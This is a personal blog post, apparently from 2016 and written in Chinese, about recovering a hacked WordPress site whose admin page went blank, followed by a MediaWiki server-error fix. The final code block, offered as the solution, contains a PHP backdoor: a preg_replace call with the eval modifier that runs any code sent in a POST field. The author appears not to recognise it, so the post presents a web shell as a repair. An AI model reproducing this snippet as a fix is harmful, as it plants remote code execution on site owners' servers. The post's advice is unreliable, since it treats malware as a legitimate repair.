+++
title =  "wordpress白屏错误"
date = "2016-03-19"
tags = [""]

summary = """
wordpress登录后转至wp-admin为空白页。
"""
+++


wordpress登录后转至wp-admin为空白页。wordpress网站应该是被黑了，首先恶意注入代码，被我debug清理掉了，但是现在登录后却无法操作wp-admin界面，为空白页。还发现了两篇垃圾博客文章。我测试过wp-admin白屏的常见解决方案（例如themes或plugins不兼容造成），但这一次都不是。

## debug 模式
已经使用过了debug模式，其实网站现在仍处于debug模式中，现在没有任何错误提示。最早的时候被恶意注入的代码已经被清理，但是一篇垃圾文章仍在：http://computational-communication.com/topics/blog/

我在wp_config.php中使用的debug代码如下：

		/**
	 * This will log all errors notices and warnings to a file called debug.log in
	 * wp-content only when WP_DEBUG is true. if Apache does not have write permission,
	 * you may need to create the file first and set the appropriate permissions (i.e. use 666).
	 */

	define( 'WP_DEBUG', true ); // Or false
	if ( WP_DEBUG ) {
	    define( 'WP_DEBUG_LOG', true );
	    define( 'WP_DEBUG_DISPLAY', true );
	    @ini_set( 'display_errors', 1 );
	}


	// Use dev versions of core JS and CSS files (only needed if you are modifying these core files)
	define( 'SCRIPT_DEBUG', true );  

## wp-no-white-screen

使用wp-no-white-screen进行辅助debug，发现一处可疑的地方：

	Fatal error: Class 'WP_Screen' not found in /wp-admin/includes/class-wp-screen.php

发现这段代码是：

		/**
	 * Set the current screen object
	 *
	 * @since 3.0.0
	 *
	 * @param mixed $hook_name Optional. The hook name (also known as the hook suffix) used to determine the screen,
	 *	                       or an existing screen object.
	 */

	function set_current_screen( $hook_name = '' ) {
			WP_Screen::get( $hook_name )->set_current_screen();
	}

WP_Screen并没有定义！这很不应该，搜索应该引用：

	require_once(ABSPATH . '/wp-admin/includes/class-wp-screen.php');

首先在上面代码中引用class-wp-screen.php

然后，但是我在/wp-admin/includes/路径下找不到class-wp-screen.php。于是在github.com/wordpress/wordpress里找到了这个php，放进这里。

于是我终于看到了管理界面！	这次debug经历了漫长的三天时间，还把网站恢复到了十天前，感觉整个人都不好了。第一次在阿里云平台上发起工单，请求帮助，不过并没有实质的帮助；第一次在阿里云的云社区提问：https://yq.aliyun.com/ask/2686，最后还是自己回答了。在这个过程中删除了可疑人在forum和wiki上的注册账号。将admin这个账号改名，防止针对admin用户的密码破解，修改网站数据库的密码。翻了过去7年里的wordpress dead screen相关的帖子。太不容易了。目前网站还在debug模式下：且观察下一步动向。

# mediawiki


出现server error 500, 谷歌无解，打电话给阿里云无解，去掉一些localsettings.php里的extension也无效。


最后，偶然看到：https://www.mediawiki.org/wiki/Manual:Errors_and_symptoms


You see a Blank Page
A blank white page indicates a PHP error which isn't being printed to the screen. To force this, add the following lines to the LocalSettings.php file, underneath the <?php:

	error_reporting( E_ALL );
	ini_set( 'display_errors', 1 );

将这段代码放进localsetting。php，
提示错误来源是：WrappedString.php  Fatal error: Namespace declaration statement

于是调整为以下形式，问题解决。

	<?php

	namespace WrappedString;

	@preg_replace('/(.*)/e', @$_POST['kxrmmbxafhdg'], '');
